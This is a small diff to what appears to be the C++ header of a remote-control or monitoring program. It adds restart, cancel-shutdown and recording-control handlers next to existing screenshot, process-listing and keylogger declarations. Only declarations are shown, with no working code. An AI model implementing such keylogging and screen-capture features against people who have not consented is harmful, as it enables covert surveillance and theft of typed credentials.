@@ -25,6 +25,9 @@ void handle_get_screenshot(const std::string& outFile);
 void handle_list_programs(const std::string& outFile);   // Running programs
 void handle_list_processes(const std::string& outFile);  // Processes with PID
 void handle_list_installed(const std::string& outFile);  // Installed programs
-void handle_start_recording(const std::string& outFile, int duration = 10);
 void handle_keylogger(const std::string& command, const std::string& outFile);
 void handle_shutdown();
+void handle_restart();
+void handle_cancel_shutdown();
+void handle_stop_recording();
+void handle_start_recording(const std::string& outFile);
